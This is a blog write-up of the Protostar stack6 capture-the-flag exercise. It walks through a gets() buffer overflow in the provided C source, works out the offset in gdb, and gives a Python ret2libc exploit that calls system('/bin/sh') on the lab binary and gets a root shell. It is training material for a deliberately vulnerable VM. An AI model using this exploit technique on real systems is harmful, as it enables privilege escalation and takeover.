---
layout: post
title: "Protostar stack06 writeup"
tags: [protostar]
comments: false
---

We are given a source code for this challenge.

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

in the description of this challenge, it recommends to use ret2libc. 
Why? because of these lines of codes, 

```
  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }
```
Because of these lines of codes, if you put any executable codes before the return address, the program will just exit out.
So that's why you need to use ret2libc

in order to use ret2libc in x86, the exploit should follow the format below(it does not always work)

```
offset+system address + exit address + /bin/bash
```

Let's get the offset first for buffer[64]

```
(gdb) disas getpath
Dump of assembler code for function getpath:
0x08048484 <getpath+0>: push   %ebp
0x08048485 <getpath+1>: mov    %esp,%ebp
0x08048487 <getpath+3>: sub    $0x68,%esp
0x0804848a <getpath+6>: mov    $0x80485d0,%eax
0x0804848f <getpath+11>:        mov    %eax,(%esp)
0x08048492 <getpath+14>:        call   0x80483c0 <printf@plt>
0x08048497 <getpath+19>:        mov    0x8049720,%eax
0x0804849c <getpath+24>:        mov    %eax,(%esp)
0x0804849f <getpath+27>:        call   0x80483b0 <fflush@plt>
0x080484a4 <getpath+32>:        lea    -0x4c(%ebp),%eax
0x080484a7 <getpath+35>:        mov    %eax,(%esp)
0x080484aa <getpath+38>:        call   0x8048380 <gets@plt>
0x080484af <getpath+43>:        mov    0x4(%ebp),%eax
---Type <return> to continue, or q <return> to quit---
0x080484f9 <getpath+117>:       ret    
End of assembler dump.
(gdb) b *getpath+43
Breakpoint 2 at 0x80484af: file stack6/stack6.c, line 15.
(gdb) r
Starting program: /opt/protostar/bin/stack6 
input path please: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x080484b2 in getpath () at stack6/stack6.c:15
15      stack6/stack6.c: No such file or directory.
        in stack6/stack6.c
(gdb) x/10x $esp
0xbffff740:     0xbffff75c      0x00000000      0xb7fe1b28      0x00000001
0xbffff750:     0x00000000      0x00000001      0xb7fff8f8      0x41414141
0xbffff760:     0x41414141      0x41414141
(gdb) info reg eax
eax            0x8048505        134513925
(gdb) p $ebp
$1 = (void *) 0xbffff7a8
```
(I have cutted out some lines that were not needed)

in order to get the offset you can follow the following

```
ebp-start of buf[64]+4
```

Still the above formula is not completely true but logically it works.

so it will be 
```
>>> 0xbffff7a8-0xbffff75c
76L
```

and 76+4 is 80 so the offset is 80

Now we need the address for system() and exit()

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
```

Lastely, the address of /bin/sh where it will be located under /lib/libc.so.6 

```
user@protostar:/opt/protostar/bin$ strings -t d /lib/libc.so.6 | grep /bin/sh
1176511 /bin/sh
```

Now we can write an exploit


exploit.py
```
import struct

def go():
        base = "A"*80
        system_loc = 0xb7ecffb0
        libc_start = 0xb7e97000
        strings_offset = 1176511
        libc = libc_start+strings_offset
        exit_loc = 0xb7ec60c0
        payload = base
        payload += struct.pack("I", system_loc)
        payload += struct.pack("I", exit_loc)
        payload += struct.pack("I", libc)
        print payload

go()

```

Then run it

```
user@protostar:/opt/protostar/bin$ (python /tmp/exploit.py;cat)  | /opt/protostar/bin/stack6 
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`췿c��
whoami
root
```

